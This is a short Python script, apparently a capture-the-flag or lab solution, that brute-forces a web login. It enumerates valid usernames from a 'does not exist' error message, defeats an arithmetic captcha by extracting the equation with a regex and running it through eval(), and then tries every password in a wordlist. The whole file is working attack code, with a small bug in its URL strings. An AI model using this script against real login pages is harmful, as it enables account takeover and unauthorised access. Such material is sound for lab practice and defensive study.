import requests
import re 

MACHINE_IP = ''
user = ''
password = ''

with open("usernames.txt","r") as file:
    names = file.read().split()

with open('passwords.txt', 'r') as file:
    passwords = file.read().split()

data = {
    'username': 'natalie',
    'password': '123',
    'captcha': '123'
}

response = requests.post(
    "http://{MACHINE_IP}/login",
    data=data
)

response = str(response.content)

for y in names:
    ## regex to find the stupid mf string
    res_string = r'(\d*) (\W) (\d*) = \?'
    equation = list(re.search(res_string, response).groups())
    print(equation)

    result = eval(''.join(equation)) #parses string into bytecode and eval the python expression
    print(result)
    
    newdata = {
        "username": f"{y}",
        "password": "123",
        "captcha": str(result)
    }

    response = requests.post(
        "http://{MACHINE_IP}/login",
        data=newdata
    )
    response = str(response.content)
    
    res_str2 = not re.search(r'The user (.*?) does not exist', response)
    
    print(response)
    
    if res_str2:
        print("Found")
        print(y)
        user = y 

for x in passwords: 
    res_string = r'(\d*) (\W) (\d*) = \?'
    equation = list(re.search(res_string, response).groups())
    # print(equation)

    result = eval(''.join(equation)) #parses string into bytecode and eval the python expression
    # print(result)
    
    newdata = {
        "username": user,
        "password": f"{x}",
        "captcha": str(result)
    }

    response = requests.post(
        "http://{MACHINE_IP}/login",
        data=newdata
    )
    response = str(response.content)
    
    res_str2 = not re.search(r'Invalid password for user ', response)
    print(response)
     
    if res_str2:
        print("Found")
        print(x)
        password = x 

        
        

